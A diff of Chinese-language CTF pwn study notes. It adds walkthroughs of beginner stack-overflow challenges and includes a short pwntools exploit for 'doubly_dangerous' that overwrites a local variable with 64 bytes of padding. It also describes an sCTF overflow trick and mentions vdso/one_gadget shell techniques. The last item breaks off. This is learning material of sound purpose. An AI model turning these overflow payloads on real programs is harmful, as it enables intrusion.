@@ -55,9 +55,37 @@ aaaa
 
 这个的点就比较骚了，我们知道只要程序开启了pie，我们就很难确定libc中的函数，所以我们这时候看到vsdo在内存中的位置是不变的,这时我们根据调用函数的返回值.可以利用他来起shell,比如说我们通过one_gagede找到了一个片段,其中的限制条件是eax为0,我们就可以根据他来起
 
-## 混淆
-我们要知道ida中
+这几天做题发现没有什么会做的,还是要夯实基础,于是在**i春秋**上找了篇教程也算是重新学习一遍吧,环境搭建不谈了,还有做题环境(ida,pwntools),没有gdb可能觉得对新手不太友好,我也不算新手了,算是个老菜鸡了,还是做吧
 
-## 扩大esp
+## 溢出点寻找
 
-我们
+这个作者写的栈溢出基础,关键就是溢出点的判断,**hello**和**csaw ctf 2016 quals-warmup**不谈了,直接无脑`cyclic`就行,从之后开始就开始学新东西了
+
+### doubly_dangerous
+
+这题没有找到很好的思路,溢出点的思路行不通,只能通过让`if`的语句成立,`s`和`v5`相差**0x40**个字节,直接修改`v5`即可,修改后的exp如下
+
+```
+#!/usr/bin/python
+#coding:utf-8
+
+from pwn import *
+
+io =process('doubly_dangerous')
+payload = 'A'*64
+payload += "\x00\x80\x34\x41"
+
+print io.recv()					
+io.sendline(payload)			
+print io.recv()					
+```
+
+### sCTF 2016 q1-pwn1
+
+这题思路很请奇,`fget`只接收32个字节,我们可以知道到栈底有0x3c个字节,加上ebp足足有0x40个字节,也就是64个字节,但是我们使用ida分析的时候会发现他进行了个替换,把所有`I`替换成了`you`,这样我们只需要写`I*(63/3)+x+ret`即可完成
+
+### Tokyo West CTF 3rd 2017-just_do_it
+
+本题也并不是修改ret,而是要将**v6**的值进行改写因为会最后`put(v6)`,而且我们之前的flag文件已经打开存到了bss中
+
+ - 直接到ret前看stack前4字节
